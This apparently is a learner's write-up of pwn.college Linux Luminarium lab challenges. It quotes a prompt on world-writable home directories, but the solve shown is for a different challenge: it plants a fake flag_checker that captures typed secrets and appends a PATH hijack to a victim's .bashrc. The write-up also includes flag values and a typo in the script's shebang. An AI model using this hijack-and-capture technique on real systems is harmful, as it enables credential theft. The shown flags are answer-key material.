# Linux Luminarium
# Module 15: Silly Sehnanigans

## Overshared Directories
Alright, Zardus has wised up --- why would he have a writable .bashrc, anyways? But a more common scenario is that users on the same system, to make it easier to collaborate, will make their home directories world writable. What's the problem here?

The problem is that a subtlety of Linux file/directory permissions is that anyone with write access to a directory can move and delete files in it. For example, let's say that Zardus has a world-writable directory for collaboration:

```
zardus@dojo:~$ mkdir /tmp/collab
zardus@dojo:~$ chmod a+w /tmp/collab
zardus@dojo:~$ echo "do pwn.college" > /tmp/collab/todo-list
```
And then a hacker comes along and does the following, despite not owning the todo-list file!

```
hacker@dojo:~$ ls -l /tmp/collab/todo-list
-rw-r--r-- 1 zardus zardus 15 Jun  6 13:12 /tmp/collab/todo-list
hacker@dojo:~$ rm /tmp/collab/todo-list
rm: remove write-protected regular file '/tmp/collab/todo-list'? y
hacker@dojo:~$ echo "send hacker money" > /tmp/collab/todo-list
hacker@dojo:~$ ls -l /tmp/collab/todo-list
-rw-r--r-- 1 hacker hacker 18 Jun  6 13:12 /tmp/collab/todo-list
hacker@dojo:~$
```
This might seem counterintuitive: hacker has no write access to the todo-list but the end result is that they can change the content. But think about it this way: a file's connection to a directory lives in the directory in the end, and users with write access to that directory can mess with it. Of course, this has security implications when important directories are world-writable.

In this challenge, for convenience, Zardus opened up his home directory:

```
zardus@dojo:~$ chmod a+w /home/zardus
```
As you know, there are lots of sensitive files in that directory such as .bashrc! Can you replicate the previous attack with write access to /home/zardus instead of /home/zardus/.bashrc?

### Solve
**Flag:** `pwn.college{w2WF8dlH8qhVuVgR58SyKeUvWF0.0VMzEzNxwiNyUDN0EzW}`

This challenge combined two concepts from earlier modules: modifying a user's .bashrc file and hijacking commands through PATH. Instead of stealing a file, the goal was to intercept a secret that Zardus manually entered into the flag_checker program. A fake flag_checker script was created that displayed the expected prompt (Type the flag) and then echoed whatever input it received. The victim's .bashrc was modified to place the directory containing the fake program at the front of PATH. When Zardus logged in and executed flag_checker, the shell found and launched the malicious version instead of the real one, causing the flag to be printed back to the screen.

```bash
hacker@shenanigans~sniffing-input:~$ mkdir ~/evil
hacker@shenanigans~sniffing-input:~$ nano ~/evil/flag_checker
(#!?bin/bash
echo "Type the flag"
cat)
hacker@shenanigans~sniffing-input:~$ chmod +x ~/evil/flag_checker
hacker@shenanigans~sniffing-input:~$ echo 'PATH=/home/hacker/evil:$PATH' >> /home/zardus/.bashrc
hacker@shenanigans~sniffing-input:~$ /challenge/victim
Username: zardus
zardus@shenanigans~sniffing-input:~$ ***********
-bash: 1498726685: command not found
zardus@shenanigans~sniffing-input:~$ flag_checker

Type the flag
*************************************************************pwn.college{4KJrUijph2pPaiqOSQNdt0S-otI.0VNzEzNxwiNyUDN0EzW}
```

### New Learnings
Learned how command hijacking can be used to intercept sensitive user input rather than simply execute malicious commands. Reinforced the importance of the PATH variable in determining which executable is launched when a command name is entered. Also gained experience combining startup-script persistence (.bashrc) with PATH manipulation to replace a legitimate program with a malicious lookalike, demonstrating a classic technique used by attackers to capture credentials, secrets, and other user-provided data.